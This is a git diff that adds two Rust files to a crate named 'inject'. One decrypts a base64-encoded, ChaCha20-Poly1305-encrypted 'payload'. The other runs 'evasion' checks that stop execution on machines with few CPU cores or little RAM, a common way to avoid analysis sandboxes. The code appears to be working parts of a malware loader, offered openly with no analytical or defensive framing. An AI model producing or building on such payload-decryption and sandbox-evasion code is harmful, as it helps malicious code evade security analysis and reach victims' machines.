diff --git a/inject/src/crypto.rs b/inject/src/crypto.rs
new file mode 100644
index 0000000..df57b58
--- /dev/null
+++ b/inject/src/crypto.rs
@@ -0,0 +1,14 @@
+use chacha20poly1305::{Aead, ChaCha20Poly1305, Key, KeyInit, Nonce};
+use base64::engine::{Engine as _, general_purpose::STANDARD};
+
+pub fn decrypt_payload(ciphertext_base64: &str, key_bytes: &[u8; 32], nonce_bytes: &[u8; 12]) -> Result<Vec<u8>, String> {
+    let ciphertext_vec = STANDARD.decode(ciphertext_base64)
+        .map_err(|e| format!("Base64 decode error: {}", e))?;
+    
+    let key = Key::from_slice(key_bytes);
+    let nonce = Nonce::from_slice(nonce_bytes);
+    let cipher = ChaCha20Poly1305::new(key);
+    
+    cipher.decrypt(nonce, ciphertext_vec.as_ref())
+        .map_err(|e| format!("Decryption error: {}", e))
+}
diff --git a/inject/src/evasion.rs b/inject/src/evasion.rs
new file mode 100644
index 0000000..0355980
--- /dev/null
+++ b/inject/src/evasion.rs
@@ -0,0 +1,21 @@
+use sysinfo::{System, SystemExt};
+
+const MIN_CPUS: usize = 4;
+const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB
+
+pub fn run_evasion_checks() -> bool {
+    // 1. CPU Core Check
+    let available_cpus = num_cpus::get();
+    if available_cpus < MIN_CPUS {
+        return false;
+    }
+    // 2. RAM Check
+    let mut sys = System::new_all();
+    sys.refresh_memory();
+    let total_memory = sys.total_memory();
+
+    if total_memory < MIN_RAM_BYTES {
+        return false;
+    }
+    true
+}
